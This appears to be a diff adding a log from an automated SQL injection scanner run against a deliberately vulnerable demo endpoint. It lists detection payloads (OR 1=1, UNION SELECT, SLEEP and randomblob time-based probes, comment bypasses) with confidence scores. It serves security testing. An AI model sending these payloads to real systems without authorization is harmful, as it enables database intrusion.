@@ -1,0 +1,50 @@
+======================================================================
+Endpoint  : [GET] http://testaspnet.vulnweb.com/Comments.aspx?id=0
+Vector    : query
+Params    : ['id']
+Source    : url
+Scan start: 2026-08-14T09:30:32.358465
+======================================================================
+
+[2026-08-14T09:30:29] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.68s  tag=ctx_num_sleep  payload=1 AND SLEEP(5)
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+[2026-08-14T09:30:29] [SAFE            ] conf=  0%  score=  0  t=0.84s  tag=ctx_num_and_true  payload=1 AND 1=1
+[2026-08-14T09:30:29] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.58s  tag=sqlite_cast  payload=' AND 1=CAST(sqlite_version() AS INTEGER)--
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+[2026-08-14T09:30:29] [SQLI_POSSIBLE   ] conf= 45%  score=  0  t=0.97s  tag=ctx_num_stacked  payload=1; SELECT 1--
+[2026-08-14T09:30:29] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.72s  tag=ctx_num_union  payload=1 UNION SELECT NULL--
+           reason: BaselineDiff: jaccard=1.00 size_ratio=0.00 sql_tokens=['select']
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+[2026-08-14T09:30:29] [SQLI_POSSIBLE   ] conf= 45%  score= 27  t=1.66s  tag=ctx_num_or  payload=1 OR 1=1
+           reason: BaselineDiff: jaccard=0.71 size_ratio=3.26 sql_tokens=[]
+[2026-08-14T09:30:29] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.68s  tag=ctx_num_union_neg  payload=-1 UNION SELECT 1,2,3--
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+[2026-08-14T09:30:29] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.63s  tag=ctx_num_time  payload=1' AND SLEEP(5)--
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+[2026-08-14T09:30:29] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.59s  tag=sqlite_version  payload=' UNION SELECT sqlite_version()--
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+[2026-08-14T09:30:29] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.59s  tag=sqlite_time  payload=' AND randomblob(500000000)--
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+[2026-08-14T09:30:29] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.56s  tag=bare_quote  payload='
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+[2026-08-14T09:30:29] [SAFE            ] conf=  0%  score=  0  t=0.96s  tag=ctx_num_arithmetic  payload=2-1
+[2026-08-14T09:30:29] [SAFE            ] conf=  0%  score=  0  t=1.08s  tag=ctx_num_comment_bypass  payload=1/**/AND/**/1=1
+[2026-08-14T09:30:29] [SQLI_POSSIBLE   ] conf= 45%  score= 27  t=1.85s  tag=double_quote  payload=''
+           reason: BaselineDiff: jaccard=0.71 size_ratio=3.20 sql_tokens=[]
+[2026-08-14T09:30:29] [SQLI_POSSIBLE   ] conf= 45%  score= 27  t=1.87s  tag=backslash  payload=\
+           reason: BaselineDiff: jaccard=0.71 size_ratio=3.20 sql_tokens=[]
+[2026-08-14T09:30:32] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.69s  tag=int_quote  payload=1'
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+[2026-08-14T09:30:33] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.71s  tag=double_dquote  payload="
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+[2026-08-14T09:30:33] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.75s  tag=int_dquote  payload=1"
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+[2026-08-14T09:30:40] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.51s  tag=error_comment  payload='/**/OR/**/1=1--
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+[2026-08-14T09:30:41] [SQLI_POSSIBLE   ] conf= 45%  score= 20  t=0.51s  tag=classic_or_comment  payload=' OR 1=1--
+           reason: BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+
+======================================================================
+Scan end  : 2026-08-14T09:30:50.150882
+======================================================================
+
